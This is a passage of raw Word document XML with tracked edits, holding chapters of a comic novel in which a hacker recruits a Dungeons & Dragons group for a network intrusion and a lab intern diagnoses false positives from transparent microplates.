          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Dungeons &amp; Dragons</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> campaign.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“Aww Christ,” he muttered. He felt the revulsion and regret of a recovered heroin addict entering an opium den. Danny’s days of chasing these particular dragons were long behind him. “Jason, can I talk to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wiggled his way from the table and crossed the compartment. He and Danny turned away from the group and spoke in whispers.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is your hacker team?” asked Danny. “Where did you find these guys?”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“They’re from my gaming group,” Jason said innocently. “We play every Thursday at the Wizards of the Coast store in Crossroads Mall.”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commentRangeStart w:id="373"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“You play </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Dungeons &amp; Dragons</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>? Aren’t you like sixty? Don’t you have a wife and kids and a life and stuff?”</w:t>
      </w:r>
      <w:commentRangeEnd w:id="373"/>
      <w:r w:rsidR="00C734CE">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="373"/>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replied coldly, “My ex-wife is none of your business.”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“Sorry, didn’t mean to hit a sore spot. But, I mean, look at these guys. Do they have any skills? Do they even have </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="374" w:author="TextVet" w:date="2016-03-15T13:38:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>real</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> jobs?”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have my complete trust,” said Jason. “They’re smart and capable. You should see the kind of shit we pull off together. Just last month, we destroyed the stronghold of a Dark Elven necromancer.”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“Your </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>characters</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> did that. In your </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>head</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.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sat around a table rolling dice and scarfing Cheetos.”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“Look, I know personnel management, alright?” Jason said. “What counts is whether you can work as a team. These guys are my comrades in arms. They’re in. Are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sighed, and turned to face the group. The men were poking through rulebooks or scribbling on papers. They looked up and mumbled greetings as he approached. “Guys. Good to meet you </w:t>
      </w:r>
      <w:commentRangeStart w:id="375"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:commentRangeEnd w:id="375"/>
      <w:r w:rsidR="009465AD">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="375"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. My name’s Danny. I’m the lead engineer at… um… Let’s just say I’ve overseen the demise of many small companies.”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shook hands with both of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Chen. Web designer and developer. ASP.NET, Ruby on Rails, HTML 5, Angular, Closure, I do it all. You want a kick-ass website, I’m your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Braun. I work at the Safeway on Queen Anne.” Danny stopped in mid-handshake. “And I’m taking Cisco certification classes at Bellevue College. Network administration — router setup, mail servers, domain name registrars, packet monitoring, that kind of stuff.”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thinks wizards can cast </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cure Light Wounds</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,” Moshen interjected.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shut up already!” Mike insisted.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“Isn’t </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cure Light Wounds</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> a priest spell?” said Danny before he could stop himself.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“See!” said Moshen, sticking his finger in Mike’s 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play?” Jason asked Danny eagerly.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shook his head. “Not since Second Edition.” That was a lie.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want to hop in?” offered Jason. “We have plenty of extra character sheets.”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closed his eyes and sighed slowly. “Is there anything else I should know about you guys before we get started? Additional skills? Um… Attributes? Proficiencies?</w:t>
      </w:r>
      <w:del w:id="376" w:author="TextVet" w:date="2016-03-15T13:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009F1E46">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play hockey!” Mike </w:t>
      </w:r>
      <w:ins w:id="377" w:author="TextVet" w:date="2016-03-15T13:44:00Z">
        <w:r w:rsidR="002A4B80">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>peacocked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="378" w:author="TextVet" w:date="2016-03-15T13:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002A4B80">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said proudly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “I can be your muscle if things get physical!”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Moshen chimed in. “And I know kung fu!”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eyed the men with a cocked eyebrow. “Hockey… and… kung fu…?”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From the hexagonal grid on the table, he picked up the two-inch pewter barbarian. It was painted with loving detail. He chuckled and shook his head. “Guys, let me give you all a reality check. This is a network penetration mission. In an ideal world this’ll be done from some Internet café and take less than ten minutes. If they have a poorly maintained firewall that crumbles under a script-kiddie attack, this whole thing will be completely anticlimactic</w:t>
      </w:r>
      <w:commentRangeStart w:id="379"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Now clear off this table, gentlemen. Keep the pencils and notebooks. We’ve got work to do.”</w:t>
      </w:r>
      <w:commentRangeEnd w:id="379"/>
      <w:r w:rsidR="002E6C0A">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="379"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>5</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pincer arm slid along the BioTek Microplate Stacker’s</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> sleek body, holding a clear rectangular plate. The plate’s surface was pitted with a grid of a hundred small round wells, each one filled with pale yellowish-brown fluid. The Stacker handed the plate off to a Synergy Microplate Reader, which drew it into a dark slot. Its payload deposited, the Stacker rose toward a vertical tower of identical plates, its pincers rotating to grab the next set of samples.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Giordano batted a lock of her unkempt dark hair out of her eyes and focused on a computer terminal beside the Reader. Laboratory robots whirred around her as she studied the console. Centrifuges spun. Pipettes trickled thin streams of fluid. Gantries and belts carried plates among devices that heated the samples; cooled them; titrated them; aspirated them; sealed them beneath plastic film; and affixed them with printed labels. With their smooth plastic contours and modular mechanical assemb</w:t>
      </w:r>
      <w:ins w:id="380" w:author="TextVet" w:date="2016-03-15T13:50:00Z">
        <w:r w:rsidR="00503D59">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ies, the machines reminded Tina of mutant Xerox office printers.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far side of the laboratory, two white-coated figures, a man and a woman, stood beside a whiteboard. Both were older than Tina by at least two decades. Over the gentle humming and clicking of the machinery, she could hear them talking in flustered tones.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is getting seriously pissed,” the man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never gets pissed. He never gets anything,” the woman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is different. I think he’s honest-to-God scared.”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“Of what? Losing our funding?”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think so,” he </w:t>
      </w:r>
      <w:del w:id="381" w:author="TextVet" w:date="2016-03-15T13:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00335811">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sai</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="382" w:author="TextVet" w:date="2016-03-15T13:51:00Z">
        <w:r w:rsidR="00335811">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>afforde</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d. “He told the Consortium that we’d have results by now. They’re coming to see for themselves.”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“Yeah. We were supposed to have results a month ago. It doesn’t make sense. The Reader logs reported expression of the full pathway in one batch several weeks back.”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Reader’s spewing out false positives,” he said with a frown. “We’ve got over a week’s worth of backlog for manual testing.”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“Isn’t that what the intern’s for? Where is she, anyway?”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haven’t heard? Julie’s gone AWOL. Nobody’s seen her in days.”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shit,” the woman sighed. “Just how high of an error rate are we dealing with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replied. “Too damn high…”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both turned to look at the machinery. The woman exclaimed,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jumped, and looked up apologetically from the console.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woman stared at her with suspicion. “What are you doing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tone almost made Tina back away. But a final glance at the screen convinced her to stand her ground. “Your reporter. You’re using gfp, right? Why wouldn’t you just use a selectable marker? CAT is standard for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isn’t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mumbled, “The mother strain is already immune to chloramphenicol,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looked at the plastic plates being handled by the robotic arms. “I just… I have a question,” she said innocently. “If you’re using gfp as a reporter, then that means you’re testing these assays for fluorescence,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woman rolled her eyes. “Yes, Tina. That’s what </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>green fluorescence protein</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> means.”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this microplate reader… It shines a specific color of light on a plate of samples, and uses camera-type-things to check if each assay is, like, ‘reflecting’ some </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>different</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> color of light.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w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> how fluorescence reading works</w:t>
      </w:r>
      <w:ins w:id="383" w:author="TextVet" w:date="2016-03-15T13:57:00Z">
        <w:r w:rsidR="002364A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="384" w:author="TextVet" w:date="2016-03-15T13:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002364A9">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385" w:author="TextVet" w:date="2016-03-15T13:57:00Z">
        <w:r w:rsidR="002364A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="386" w:author="TextVet" w:date="2016-03-15T13:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002364A9">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 xml:space="preserve">he woman </w:t>
      </w:r>
      <w:ins w:id="387" w:author="TextVet" w:date="2016-03-15T13:57:00Z">
        <w:r w:rsidR="002364A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">might have been addressing an intruder in </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="388" w:author="TextVet" w:date="2016-03-15T13:58:00Z">
        <w:r w:rsidR="002364A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>her</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="389" w:author="TextVet" w:date="2016-03-15T13:57:00Z">
        <w:r w:rsidR="002364A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> first-class cabin</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="390" w:author="TextVet" w:date="2016-03-15T13:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002364A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>replied sardonically</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“Thanks. So, then, can you explain to me…” She grabbed an empty plate </w:t>
      </w:r>
      <w:ins w:id="391" w:author="TextVet" w:date="2016-03-15T13:57:00Z">
        <w:r w:rsidR="002364A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>from</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="392" w:author="TextVet" w:date="2016-03-15T13:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002364A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>off of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> one of the machines and waved it </w:t>
      </w:r>
      <w:ins w:id="393" w:author="TextVet" w:date="2016-03-15T13:56:00Z">
        <w:r w:rsidR="002364A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>before</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="394" w:author="TextVet" w:date="2016-03-15T13:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002364A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>in front of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> her face, </w:t>
      </w:r>
      <w:ins w:id="395" w:author="TextVet" w:date="2016-03-15T13:59:00Z">
        <w:r w:rsidR="00010EB5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>beholding</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="396" w:author="TextVet" w:date="2016-03-15T13:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00010EB5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>looking at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="397" w:author="TextVet" w:date="2016-03-15T13:59:00Z">
        <w:r w:rsidR="00FD3E6F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>both</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="398" w:author="TextVet" w:date="2016-03-15T13:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FD3E6F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the </w:delText>
        </w:r>
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FD3E6F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText>two</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> scientists through the clear plastic. “…why the hell you guys would use </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>transparent microplates</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shrugged. “The clear ones are cheap. We had a huge supply of them down in the stockroom.”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“Are they cheap enough to make it worth redoing a whole month of automated runs? Because, if the plate is see-through, then light can shine from one well to another. Which means that, if one well is fluorescing really strongly, then the reader will pick up a little bit of light </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>in all of the wells next to it</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, too.”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man’s eyes widened. “Well-to-well crosstalk!”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“Exactly!” Tina nodded. “Which would lead to…”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facepalmed. “False positives. Of course. We didn’t even think of something so basic…”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“Instead of reporting uptake in </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>one</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> sample,” said Tina, “the reader will report uptake in </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nine</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of them. So what you get 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woman interrupted her, “What you get is way above your pay grade, Tina. You’re not even authorized to be in this lab.”</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Tina’s jaw dropped. “Really?”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said, “Tina, this </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
